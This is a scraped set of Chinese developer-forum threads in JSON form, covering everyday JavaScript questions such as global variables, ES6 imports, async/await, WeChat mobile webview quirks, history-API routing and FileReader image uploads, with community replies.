class=\"topic_content\"><a target=\"_blank\" href=\"http://pan.baidu.com/s/1mgPzG1q\" rel=\"nofollow\">http://pan.baidu.com/s/1mgPzG1q</a> 下载地址修正</div>"], "reply": "5", "tittle": "全局变量外露问题，解决方案！！！！", "comment": ["不明觉厉", "看来都放假了，没有吐槽", "使用 use strict; 禁止全局变量就好了。\r", "火孤 hhhhhhhhh : )", "babel+ES6+strict 解决你一切的困惑"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"http://i8.tietuku.com/397022987d8ed332.png\" alt=\"\"></p>\n\n<p>为毛啊</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/davgothic/AjaxFileUpload/blob/master/demos/basic.html\">https://github.com/davgothic/AjaxFileUpload/blob/master/demos/basic.html</a></p>\n</div></div>"], "reply": "1", "tittle": "关于 ajaxfileupload 的问题，一直提示 not defined ..", "comment": ["ajaxFileUpload()吧？小写的 a ，我没见过这样的方法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>谁能提供相关的文档参考下吗</p>\n\n<p>想实现类似的功能</p>\n</div></div>"], "reply": "9", "tittle": "Mega 下载文件是用 H5 的 storage？", "comment": ["可以看看这个\r", " Thanks ！", "原理和 demo 可以看我 2013 年写的这篇文章：\r", " ing", "现在写 H5 终于也没人吐槽了", " 懒得吐槽了，无知者无罪嘛。", " 赞 ！", " 嘿嘿", "<h5></h5>"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>其实代码拼成图形不麻烦，最麻烦的是拼完了之后，代码仍然可以运行，为这个做了很多工作。</p>\n\n<p>github 开源地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/xinyu198736/js2image\">https://github.com/xinyu198736/js2image</a>  欢迎围观。</p>\n\n<p>这里还有篇技术细节讲解的文章： <a target=\"_blank\" rel=\"nofollow\" href=\"http://zhuanlan.zhihu.com/yutou/20439979\">http://zhuanlan.zhihu.com/yutou/20439979</a></p>\n\n<p>效果：可以看一下我们公司官网页面里的 js ， <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.souche.com\">http://www.souche.com</a><br>\n <a target=\"_blank\" rel=\"nofollow\" href=\"http://assets.souche.com/assets/js/lib/jquery-1.7.1.min.js\">http://assets.souche.com/assets/js/lib/jquery-1.7.1.min.js</a><br>\n效果图：</p>\n\n<p><img src=\"http://ww3.sinaimg.cn/mw1024/6663ae3cjw1ez9r1m76u2j21ez10s4lg.jpg\" alt=\"\"></p>\n</div></div>"], "reply": "34", "tittle": "写了一个可以把你网站所有 js 代码格式化成圣诞树的 NodeJS 库： js2image", "comment": ["看来贵公司很闲...  把所有 js 都处理了下。是不是功能都要测一遍才敢上啊....", " 其实只替换了主要的几个 js ，随手测了下没报错就上了。。。", " js 是运行时的随手测不一定能测全。朱一比较保守。不太敢这么玩....", " 不过确实挺有趣的", "可以扩展一下，拼成个对联。。。。", "你们。。赢了。。", " 有图片就能拼。。。", " 官网用的人不多了。。。没人管，随便改，哈哈", "你牛你说话", "也是寂寞的够了", "有女朋友么", "看来工作不饱和啊，不得不说这个团队氛围真的很赞", " 早结婚了，老婆还没毕业的时候就领证了", "用 c 比较无压力", "已经 110 个 star 了，顶上去，走出中国冲出世界登录火星", "建议加上英文版 readme_EN ，哈哈", "要有英文才能登上火星。", " 我顶你", "这就是 javascript 要加分号的重要原因", " 英文已加", " 过年可以拼成对联", " 这个其实没这么麻烦，通常这种格式美化只是换行和空格的调整，并不会改变代码的执行逻辑\r", "\r", "所以，拉出 AST 来看是不是没变就行了，我看到有少数的字符串被分开做+运算以便能够插入换行，这个可以很简单地在 AST 上做 merge 的\r", "\r", "也有可能会额外加入一些空语句来填充一些位置，这个我不确定是否方便，但做 tree shaking 应该也可以有效地去除\r", "\r", "但总的来说，嗯，你确实得很闲", "很有新意，已 star", "已经上 trending 。。。", " 恩，不过我不太懂 AST ，为了快速实现，用了暴力的字符串分析，也写了篇文章分析其中涉及的技术。不过不用 ast 的问题就是如果考虑不够全的话，不能保证 100%的编译成功。", "求 python 版", "芋百万 V587..", "“官网用的人不多了。。。没人管，随便改”\r", "\r", "老板看见会不会发飙啊？", " 不会，我们公司的业务就不在官网。。。已经一年多没动过代码了", " 66666", "...怎么恢复？", " ...怎么恢复？\r", "\r", "23333333333", " 恢复的话，格式化一下应该就好吧 o3o", " 源代码都在的。。。你访问我一个 js 的时候我会判断是否存在.xmas.js ，如果存在就输出 xmas 地内容，过了明天直接改一下这个配置就可以了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>研究僧<br>\n隔壁教研室目前在做一项交通数据调研，要了解整个市区实时路况情况。<br>\n高德地图可以显示本市实时路况。<br>\n高德LBS平台可以免费申请key调用数据<br>\n官网实例中api调用是js接口：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://lbs.amap.com/api/javascript-api/example/d/0402-2\">http://lbs.amap.com/api/javascript-api/example/d/0402-2</a><br>\n其中调用了js脚本：<br>\n&lt;script type=\"text/javascript\" src=\"http://webapi.amap.com/maps?v=1.3&amp;key=7ba42b62224e28a20770deeb2a2ce246\"&gt;&lt;/script&gt;<br>\n7ba42b62224e28a20770deeb2a2ce246是我申请的key<br>\n打开看了下，似乎是压缩过的，看不太懂</p>\n\n<p>目前的打算是修改js，然后每隔一段时间cron跑一遍 把路况储存在文件里。<br>\n小弟对js不是很懂，求指教：<br>\n根据官网调用实时路况的js<br>\n如何如何获取 每条街道的实时路况<br>\n畅通 缓行 拥堵 严重拥堵 一共四种状态 用1234数字表示</p>\n\n<p>如有解答，感激不尽!</p>\n</div></div>"], "reply": "19", "tittle": "提问 JavaScript 问题：高德地图实时路况数据 JavaScript API 如何调用", "comment": ["福利：回复送赞。", "从 JS SDK 看应该是没法直接获取到你要的数据。这个 JS SDK 是直接从服务端请求到图片然后绘制到 canvas 上了。\r", "\r", "只有类似这样子的东西。\r", "\r", "想要得到原始的数据还是比较困难的，这些都属于高德的核心数据吧，怎么会随便开放的呢。", " 哦哦 原来是这样！\r", " 唉 看来是不能做了  \r", "无论如何还是感谢", "图像处理可破", " 可惜路型不规律 很难一个一个标记", "市区道路网是不变的吧，获取了基础的一张图，之后按像素统计就好了，有算法可以计算每个像素对应的经纬度", " 嗯嗯 python大法好？推荐个库呗？", " 额，具体咋写就不知道了\r", "流程应该就是先获取一套最大级别瓦片，把有颜色的部分处理成黑色，然后隔一段时间获取对应url的瓦片，处理成灰度图，比较每个像素点的值就行了\r", "根据瓦片做统计，之后多线程也容易搞\r", "\r", "我觉得大概是这么弄，经纬度换算你百度tile map system 第一个地址里面应该就有算法，github里面也有各版本的开源代码", " tks a lot！", " 库的话貌似用opencv?我觉得这个东西做图像处理貌似不难，估计opencv都不用……", " 没事，我主要是做地图前端的，平常没玩过图像处理…", " 额 给赞~好专业~", " 您好 我现在毕业论文也是做实时交通研究的 请问您这个问题解决了吗？能否告知用的具体方法是什么？感激不尽啊~", " 答案是否定的 不能直接提取拥堵情况 只能提取到图片 如 2 楼所言 4 楼的方法是可行的 但图像处理不太会 应该挺麻烦的 如果数据量不大的话建议手动处理.....师兄最后也是这么干的 另外拥堵数据高德的准 百度的不准 真的不准...", " 还是谢谢楼主 我之前数据量不大也是手动截取的  只是见有人用自动方法成功过才问您的  那只是将有实时路况数据的瓦片下载下来您会吗", " 大神，能告诉我怎么得到这个 Url 。 QAQ,我现在也在做这个。", " 学长能告诉我怎么能提取到路况信息的图片吗，我最近参加大赛也在做这个。图像处理那一块准备用 ENVI 试试。 Q=Q 。", " 已忘光", "好的，打扰了。 QAQ"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JavaScript 语言本身最近最为火爆的莫过于开始使用 ES6 或者尝试 E7 ，但是新特性中要谈的点又很多，不过个人比较关注异步调用的处理方式。</p>\n\n<p>所以整理了一篇文章，主要就是介绍下目前我比较喜欢的 async/await 方案，也对比了 Promise 和 RxJS ，貌似之前很多人讨论。</p>\n\n<p>Blog 地址  <a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.leancloud.cn/3910/\">https://blog.leancloud.cn/3910/</a></p>\n</div></div>"], "reply": "9", "tittle": "「大概可能也许是」目前最好的 JavaScript 异步方案 async/await", "comment": ["冲头像顶一个。\r", "\r", "另外，欢迎关注可以全面 ES6/7 特性进行开发的 Node.js 服务端框架 —— ThinkJS 2.0 ， ", "很久没碰 node.js 了，看了楼主的帖子，有个疑惑，望解答：\r", "const testAsync = async () => {\r", "  const t = await f();\r", "  console.log(t);\r", "};\r", "\r", "testAsync();\r", "--------------\r", "假如我在 testAsync();后面不小心加了句 callOtherFunc();，并且忘记了 testAsync 其实是阻塞的，也就是说我在写 callOtherFunc()的时候，没料到 callOtherFunc()会被阻塞一段时间后才会调用。那在这里会不会是个坑呢？\r", "本来用纯 Promise 的时候，我 callOtherFunc 可以立即作为同步代码被执行到，可是换成了 async/Promise 混用的时候，我就得转变思路，写每一行代码都小心翼翼\r", "求楼主解惑", "虽然不想说这些但是：\r", "为什么要造这些无聊的轮子\r", "明知道没人会去用的", " 总得折腾点什么 谁知道因缘际会发生什么", "  async/await 是 JavaScript 语言支持的新特性，不是轮子啊。。。", " (づ￣ 3 ￣)づ么么哒~~", " 抱歉，我说的是 1 楼那个，漏了 @", " 首先我不是 ThinkJS 的作者，而是用户。其次，你觉得这个是什么的轮子？如果你是指 express/koa 等，那 php 下那么多 web 框架也可以都不用开发了。另外，明知道没人会去用的结论不知你从何得知。", " 你不会用不代表别人不用。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一个 JavaScript &amp; jquery 视频教程合辑，希望对学习 web 前端的童鞋有所帮助吧。</p>\n\n<p>Javascript 初步</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.maiziedu.com/course/web/229-1988/\">http://www.maiziedu.com/course/web/229-1988/</a></p>\n\n<p>Javascript 进阶</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.maiziedu.com/course/php/580-8345/\">http://www.maiziedu.com/course/php/580-8345/</a></p>\n\n<p>JavaScript 面向对象编程</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.maiziedu.com/course/web/583-8416/\">http://www.maiziedu.com/course/web/583-8416/</a></p>\n\n<p>jquery 视频教程</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.maiziedu.com/course/python/303-2785/\">http://www.maiziedu.com/course/python/303-2785/</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "分享 JavaScript & jquery 视频教程合辑", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>效果</h2>\n\n<p>鼠标滑入元素后， hover 层从鼠标滑入的边界处滑入。</p>\n\n<h2>源码</h2>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lizijie1993/LgHover\">源码传送门</a></p>\n\n<h2>在线实例</h2>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://lizijie1993.github.io/LgHover/lgShow.html\">实例传送门</a></p>\n\n<p>请大家无视兼容性问题，该问题在整体完成后再解决。</p>\n\n<h2>疑问</h2>\n\n<p>在我写的方法中，每当触发<code>mouseenter</code>事件时，需要将 hover 元素移动至事件触发时边界的外面，然后再移入。但若编写如下代码：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">div</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">querySelector</span><span class=\"p\">(</span><span class=\"s1\">'div'</span><span class=\"p\">);</span>\n\n<span class=\"nx\">div</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">left</span> <span class=\"o\">=</span> <span class=\"s1\">'0'</span><span class=\"p\">;</span>\n<span class=\"nx\">div</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">left</span> <span class=\"o\">=</span> <span class=\"s1\">'100px'</span><span class=\"p\">;</span>\n</pre></div>\n\n<p>当真正调用时，由于 javascript 引擎优化，元素的 left 会被直接设置为 100px ，无法达到我的目的。</p>\n\n<p>目前我的解决方案是使用定时器，将第二次坐标的改变延迟，形如：</p>\n<div class=\"highlight\"><pre><span class=\"nx\">div</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">left</span> <span class=\"o\">=</span> <span class=\"s1\">'0'</span><span class=\"p\">;</span>\n\n<span class=\"nx\">setTimeout</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">div</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">left</span> <span class=\"o\">=</span> <span class=\"s1\">'100px'</span><span class=\"p\">;</span>\n<span class=\"p\">},</span><span class=\"mi\">20</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>请问：<br>\n有没有其他更好的方式解决该问题？</p>\n</div></div>"], "reply": "10", "tittle": "仿拉勾官网图片随鼠标滑入效果，有个小疑问", "comment": ["你提问题的姿势好优美", " 是我提问方法有问题么。。还是说我没描述清楚。。。", "提问姿势确实优美", " 是真的优美＝。＝ 没有反义", " 哈哈哈哈", "讲真，完整代码太长，不怎么想看。不负责任的提个意见，你可以试试看：（因为自己没有尝试过，不保证有效）\r", "两个连续赋值语句之间加个 console 打断一下。", "有没有试用 transform 而不是直接把元素移出去", "代码留下了，最近也要做一个类似的效果，谢谢楼主分享。\r", "\r", "我记得有特别的 trick 可以强制 reflow 的执行，楼主可以搜索一下，不是特别确定，并且貌似也并不是什么好的 practice 。", "真的优美，学习提问的姿势...", "我找到了一个新的方法触发 flow ，替换定时器方案，原理是获取该元素的属性，形如：\r", "\r", "```javascript\r", "div.style.left = '0px';\r", "window.getComputedStyle(div,null)['left'];\r", "div.style.top = '100px';\r", "```\r", "\r", "同时源码做了部分更新，兼容性还未处理完毕～希望大家有空可以看看，提提建议。如果有需要，可以 star 一下～\r", "\r", "源码地址见问题部分。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var array1 = ['A', 'B', 'C'],<br>\n    array2 = [],<br>\n    done = {}, random;                                  // {} 在这里是什么东西呢？</p>\n\n<p>while (array1.length * 2 != array2.length) {<br>\n    random = Math.floor(Math.random() * array1.length);<br>\n    if (done[random] != 2) {                //这一步完全不理解<br>\n        array2.push(array1[random]);<br>\n        done[random] = (done[random] || 0) + 1;      //还有这个<br>\n    }<br>\n}</p>\n\n<p>：）</p>\n</div></div>"], "reply": "4", "tittle": "求助 请帮忙解释 2 行 javascript 代码", "comment": ["{}就是一个空对象，和第 2 行一个路数（快速创建新数组 /对象）\r", "random 被赋值为 0 到 array1 长度之间的一个随机值，所以 done[random]就是取 done 这个对象的某个随机的属性（把 done 看成一个数组也没啥问题），又所以 done[random] != 2 保证 done 的成员最终都会变成 2 。\r", "done[random] || 0 （应该是看不懂这个吧）的意思是「取 done[random]，如果取到的是 undefined 、 null 之类的逻辑否值，则返回 0 ，相当于给个替换空值的默认值）。\r", "\r", "这是个啥程序？掏兜摸小球、每个摸两次？", " 谢谢你啦 ：） 这个程序的作用是把 a b c 分别两次写道新的数组里， 并且是无序排列", "done 是一个计数器\r", "array2.push(array1[random]);//array1 的数据插入之后\r", "done[random] = (done[random] || 0) + 1; //done 加 1\r", "\r", "if (done[random] != 2) { //当 done 计数为 2 的时候，不做 push ，继续随机", "1. 你把 done 看成一个 hash ， key 是生成的随机数， value 是自己维护的计数\r", "2. done[random] = (done[random] || 0) + 1; 看成这样就行了\r", "\r", "    var tmp;\r", "    if (done[random])\r", "        tmp = done[random];\r", "    else\r", "        tmp = 0;\r", "\r", "    done[random] = tmp + 1;"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近做微信上网站开发时，时常会出现 ios 或 android 上一些样式或者 js 方法不能用的，大家有没有遇到类似的情况可以分享下，就我个人遇到的，有以下两种。</p>\n\n<p>1 、 js 的 event.preventDefault ()方法不能禁止 ios 上长按图片出现保存图片选项的情况，也是今天在 V2EX 上找到解决方案的，通过设置-webkit-touch-callout:none 解决，感谢 @nealv2ex 。</p>\n\n<p>2 、微信接口，调用图片选择接口时，返回一个 localId ，上传的时候， ios 会出现问题，上传不成功，需要先 localId=localId.toString ()，才能上传成功</p>\n\n<p>3 、微信上把图片选择接口获取到的 localId 赋值给 img 的 src 时，在 ios 上会变成全部是小写字母(wxLocalResource... =&gt; wxlocalresource )，这时候如果获取 img 的 src 来调用微信的上传图片接口时也会出现错误。</p>\n</div></div>"], "reply": "9", "tittle": "ios 或者 android 浏览器上有没有什么特别的坑，需要用特别的方法来填补的", "comment": ["iOS 上不准用第三方的浏览器引擎 所以都只能用苹果阉割版的 webkit 很蛋疼\r", "Mozilla 因为这个原因停止发布 iOS 版的 firefox", " 那 Chrome 怎么搞的？", "ios input 输入框 获取焦点之后 如果你不手动点击键盘右上角的完成按钮，晃动手机 会出现 撤销键入。即使你把 input 从 dom 里面删除还是会出现", " 必须感谢这一点，否则企鹅立马用上自家的 X5 引擎了。 Android 上已经被这 X5 恶心死了。", " Chrome 就是用 WKWebview 包装的", " 错了是 UIWebView 还没有迁移到 WKWebView 所有 iOS 上第三方浏览器都只能用苹果的这两个类 不然上不了架\r", "\r", "但是这两个类都是阉割掉很多功能 并且版本严重落后 iOS 自带的 Safari 的 build\r", "这样 iOS 自带的 Safari 就有了极大的优势 无论是 Js 优化还是渲染优化 都比其他浏览器要做的好得多\r", "好像唯一一个让发布自己渲染引擎的是 Opera", " iOS 版 Firefox 马上会有的了，现在是 preview 阶段。 ", " 相关新闻在官方 blog 中提到。 ", " 同被 X5 恶心，都查不出来它兼容什么不兼容什么", "再补充一条，微信上录音是 amr 格式，用 audio 在 android 的微信上可以播放，在 ios 上不支持，需要在后台用 FFmepg 来转换。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，用了下面的代码来防止还是不行。<br>\n//通用阻止事件冒泡方法<br>\nfunction stopBubble (e ){</p>\n\n<p>// 如果传入了事件对象，那么就是非 ie 浏览器<br>\nif (e&amp;&amp;e.stopPropagation ){<br>\n    //因此它支持 W3C 的 stopPropagation ()方法<br>\n    e.stopPropagation ();<br>\n}else{<br>\n    //否则我们使用 ie 的方法来取消事件冒泡<br>\n    window.event.cancelBubble = true;<br>\n}<br>\n}</p>\n\n<p>//阻止浏览器的默认行为 <br>\nfunction stopDefault ( e ) {</p>\n\n<p>//阻止默认浏览器动作(W3C ) <br>\nif ( e &amp;&amp; e.preventDefault ) <br>\n    e.preventDefault (); <br>\n//IE 中阻止函数器默认动作的方式 <br>\nelse<br>\n    window.event.returnValue = false; <br>\nreturn false; <br>\n}</p>\n</div></div>"], "reply": "26", "tittle": "ios 微信上如何通过 js 禁止长按保存图片事件", "comment": ["作为背景展现", "放一个透明的层在前面， Flickr 原来就是这么弄的", "没什么意义，只会让用户降低好感度", "如果是为了防止用户保存图片那还是算了，用户表示我们可以截图", " 赞", "确实意义不大", "没用", "如果用户选择在浏览器中打开呢？", "用 div 和 background-image ？\r", "首先 new Image () ， onload 获得图片宽高，丢弃这个 image 对象，然后创建一个 div, style=\"background:XXXX\"\r", "\r", "依然防止不了截图党", "-webkit-touch-callout\r", "\r", "google 移动端 图片 保存", "img {\r", "  pointer-events: none;\r", "}", " 是在图片上添加了长按的事件，然后老是会出现保存的现象，用户体验很不好，不是为了防止保存图片哦", " 不是防止截图，是事件冲突", " 我觉得你可以改成别的，毕竟长按算是系统的功能。或者就直接弄成背景", " 改成双击或者直接加按钮都比这个要好，为什么非要用长按呢？", "react-canvas", "切碎了拼图。啥图片啊给看还不让存。。", "为了保护图片？", " 赞", " 客户需要，长按录音功能", " 你不了解一下为什么需要长按开始录音？\r", "反正我是觉得这个操作不直观，不信你问 V 友是不是这么想的。", "用背景图呀。", " \r", "1 、操作不直观，有提示如何操作\r", "2 、为什么需要，微信上录音功能是如此的，不希望又培养用户另一个使用习惯，成本高，而且还是用户已经用习惯微信录音功能的基础上，毕竟微信上录音功能用得还是蛮顺手的。", "背景图片是王道", "逆天而行", "图片添加了事件，所以不好用背景图"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 、获取到图片的 localId 后，赋值给 img 的 src ，但是调用 canvas 的 toDataUrl 会出现跨域问题，有什么解决办法吗？<br>\n2 、调用微信接口获取的图片，怎么获取 exif 信息，用 exif.js 好像不行。</p>\n</div></div>"], "reply": "5", "tittle": "通过微信接口获取到图片的 localId，怎么能用 canvas 的 toDataUrl?", "comment": ["下载到本地再处理呢", "var image = new Image ();\r", "image.crossOrigin = '';\r", "\r", "试试看这样能否解决跨域的问题？", " 这个试过了，不行，可能微信那边没开权限", "图片没开放权限的话跨域是无解的。要不安全性哪里来……", " 直接用 html 的文件上传咯，微信那个图片选择接口在安卓下貌似有许多小问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为要用到地图服务的 Javascript API ，所以想到如果用 ES6 的话， import 有没有引用在线文件的用法。<br>\nRequirejs 可以用 async 这种方式：<br>\n<code><br>\ndefine (['async!http://webapi.amap.com/maps?v=1.3&amp;key=XXXXXXXXXX'], function () {<br>\n  return AMap;<br>\n});<br>\n</code><br>\n如果 import 无能为力的话，有没有什么其他优雅的解决办法？</p>\n</div></div>"], "reply": "11", "tittle": "ES6 的 import 有办法引用在线的 Javascript 文件么？", "comment": ["import 干不了这个活吧，为什么不把那个，你直接在模版里引用这个 js 不行吗？", " 可能是我有一点强迫症吧……不太喜欢暴露全局变量", " 就 tm 一个全局变量也不爽...", "AMD ？", " ES6 的模块和 CMD 、 AMD 都不一样", " 你不一定非要用 ES6 的嘛……包装一下不也挺好的……", "可以用 systemjs:\r", "\r", "\r", "不过建议通过 jspm 来用 systemjs:\r", " 谢谢，我研究下", "楼主研究出来方法没有？我最近用 webpack 打包项目也遇到同样的问题..", "浏览器中的下一代 javascript 模块的异步加载标准正在制定中，你可以看看： ", " 虽然看不懂，但还是谢谢你……"]},
{"content": ["<div class=\"topic_content\">花瓣（ Pinterest ）这种风格的 route ：\r<br>\r<br>1. 在主页或者瀑布流列表页，点击单个 item\r<br>1.1 地址栏变成单个 pin 的 url ，比如： <a target=\"_blank\" href=\"http://huaban.com/pins/469222884\" rel=\"nofollow\">http://huaban.com/pins/469222884</a> ，注意，此时页面并没有刷新;\r<br>1.2 单个 pin 的内容是以 modal 的形式弹出来，覆盖在原来的瀑布流列表页上面，瀑布流列表页并没有remove；\r<br>1.3 关闭 modal 单页，地址栏变回列表页 url\r<br>\r<br>2. 直接访问单个 item\r<br>比如还是那个单个 pin 的 url ： <a target=\"_blank\" href=\"http://huaban.com/pins/469222884\" rel=\"nofollow\">http://huaban.com/pins/469222884</a>, 直接是内容页。\r<br>\r<br>\r<br>请教前端的朋友，这种效果大概是怎么做的？是什么单独的技术，或者 best practice 吗？\r<br>有没有相关的库、文章可以学习？</div>"], "reply": "19", "tittle": "花瓣网这种 Route 是如何做的", "comment": ["上面的链接挂了，关键词： html5 history api", "基本就是楼上说的那样，大概的应用原理就是，点某个 item 的时候通过 AJAX 加载这个 item 的内容到列表页上，然后通过 window.history.pushState 改变当前地址栏显示的 url （实际上你还是停留在列表页）", "history 类似的还有 网易云音乐 WEB 版这种跳转不会中断播放 也是用的这种特性", "直接访问回页面， ajax 请求回数据。同一个数据要做两手准备，后端做起来挺麻烦的。", "现在主流框架都支持,楼上说得没错,有一些是用 html5 history api.\r", "pajax,react,angularjs 都支持,自己手动写比较麻烦,建议使用框架,这样对于不支持 html5 的浏览器,也能很好支持.", " 网易那个是用 hash 做路由的，跟花瓣的不一样。", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "知道方向就好找资料了，多谢各位回复！", "楼上说的没错， HTML History API 。并不是什么新鲜的东西了。\r", "花瓣这个，具体的方案是用了 History.js ，会自动在不兼容的浏览器上使用 hash tag 来实现。", " \r", " \r", "网易云音乐内嵌一个 iframe ， URL 控制刷新 iframe 里的页面", " 多谢！", " 网易云音乐之类的跟这个不太相同, 播放控件是放在外层,内页全部用 iframe 加载. 以前干过这档子事..", "利用 HTML5 History API ，以前封装过这样的库 ", "\r", "在现代浏览器上使用 pushState ，在低版本浏览器上（ IE8, IE9 ）使用 hash ，对更低的 IE6~7 和不执行 js 的搜索引擎蜘蛛则保持默认跳转。\r", "不过已经很久不维护啦", "直接访问和当前页弹框应该是两套模板。但我个人是很憎恨这样搞的，因为我认为相同路由就应该给我相同的响应。正面例子是 Chrome 应用商店。", "搜 pjax 就是你要的东西。", "关键词 pjax", "相关内容 ajax", "如果你用 React 的话，这份 react-router 的范例代码准确的实现了你的需求： "]},
{"content": ["<div class=\"topic_content\"><p>PS ：<br>\n1. 貌似 <a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/\">https://gist.github.com/</a>  现在无法使用，就贴个图吧；<br>\n2. 下面的代码已经可以正确得到结果，也就是从其它网站读来数据，并把数据赋值给一个变量，可以供其它代码调用。但帖子主对 JavaScript 不怎么懂，东拼西凑搞出来的，为了没有什么硬伤，或是使代码更简洁，所以贴出来请大家看看，希望听到些纠错或改进建议。<br>\n3. 先谢！<br>\n4. 如果贴到这里的看不清楚，可以看这里的原尺寸图片： <a target=\"_blank\" rel=\"nofollow\" href=\"http://pic.yupoo.com/ooof_v/EW9VULtq/LGHzT\">http://pic.yupoo.com/ooof_v/EW9VULtq/LGHzT</a></p>\n\n<p><img src=\"http://pic.yupoo.com/ooof_v/EW9VULtq/LGHzT\" alt=\"image\"></p>\n</div>"], "reply": "目前尚无回", "tittle": "这段「跨域数据转换为变量」的代码有问题吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在工作的过程中遇到了一个问题，就是在移动设备上图片上传的问题。考虑到在移动设备上，所以为不防止出现差用户体验，所以用到了 HTML5 中的 FileReader ；</p>\n\n<p>&lt;?php<br>\n    if ($_SERVER['REQUEST_METHOD'] == 'POST'){<br>\n        var_dump (array (<br>\n            'GET' =&gt; $_GET,<br>\n            'POST' =&gt; $_POST,<br>\n            'FILES' =&gt; $_FILES,<br>\n        ));</p>\n<div class=\"highlight\"><pre>foreach ($_FILES as $file ) {\n        echo \"file \", $file['tmp_name'], PHP_EOL;\n        echo \"   size is \", filesize ($file['tmp_name']), PHP_EOL;\n    }\n\n    return;\n}\n</pre></div>\n\n<p>?&gt;</p>\n\n<p>&lt;!DOCTYPE html&gt;<br>\n&lt;html&gt;<br>\n&lt;head&gt;<br>\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;<br>\n    &lt;meta name=\"HandheldFriendly\" content=\"true\"&gt;<br>\n    &lt;meta name=\"MobileOptimized\" content=\"width\"&gt;<br>\n    &lt;meta name=\"viewport\" id=\"viewport\" content=\"width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\"&gt;<br>\n    &lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"&gt;<br>\n    &lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"&gt;<br>\n    &lt;meta name=\"applicable-device\"content=\"mobile\"&gt;<br>\n    &lt;style type=\"text/css\"&gt;<br>\n        img{<br>\n            width: 320px;<br>\n        }<br>\n        #result div{<br>\n            margin: 2em;<br>\n            border: 1px solid darkgray;<br>\n            white-space: pre;<br>\n        }<br>\n    &lt;/style&gt;<br>\n&lt;/head&gt;<br>\n&lt;body&gt;<br>\n    &lt;ul id=\"images\"&gt;&lt;/ul&gt;<br>\n    &lt;input type=\"file\" id=\"addImg\" value=\"add images\" accept=\"image/*\" multiple=\"multiple\" /&gt;<br>\n    &lt;input type=\"submit\" id=\"submit\" value=\"submit\"&gt;<br>\n    &lt;div id=\"result\"&gt;&lt;/div&gt;<br>\n    &lt;script&gt;<br>\n        (function (){<br>\n            var images = [];<br>\n            var $addImg = document.getElementById ('addImg');<br>\n            var $images = document.getElementById ('images');<br>\n            var $submit = document.getElementById ('submit');<br>\n            var $result = document.getElementById ('result');</p>\n<div class=\"highlight\"><pre>$addImg.addEventListener ('change', function (){\n            for (var i = 0; i &lt; $addImg.files.length; i++){\n                (function (file ){\n                    var reader = new FileReader ();\n                    reader.onload = function (){\n                        var $img = document.createElement ('img');\n                        $img.src = reader.result;\n                        var $li = document.createElement ('li');\n                        $li.appendChild ($img );\n                        $images.appendChild ($li );\n                        images.push (file );\n                    };\n                    reader.readAsDataURL (file );\n                })($addImg.files[i]);\n            }\n        });\n\n        $submit.addEventListener ('click', function (){\n            var data = new FormData ();\n            for (var i = 0; i &lt; images.length; i++){\n                data.append ('images' + i, images[i]);\n            }\n            var xhr = new XMLHttpRequest ();\n            xhr.onreadystatechange = function (){\n                console.log ('ready state change: ' + xhr.readyState + ' -- ' + xhr.status + ' (' + xhr.statusText + \")\");\n                if (xhr.readyState == 4 ){ // done.\n                    var $div = document.createElement ('div');\n                    $div.innerHTML = xhr.responseText;\n                    $result.appendChild ($div );\n                }\n            };\n            xhr.open ('POST', location.href );\n            xhr.send (data );\n        });\n    })();\n&lt;/script&gt;\n</pre></div>\n\n<p>&lt;/body&gt;<br>\n&lt;/html&gt;<br>\n大概就是给 type 为 file 的 input 添加一个 change 事件，然后遍历选中的文件，增加一个文件就增加一个 li ，然后将 li 插入到 ul 中。重要的是 reader.readAsDataURL (file );这个是将文件读成编码的形式。$img.src = reader.result;将 src 设成 reader 返回的。</p>\n\n<p>下面的那个就是添加了一个点击事件，将收集到的文件传到服务端。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "移动设备在线预览图片", "comment": []},
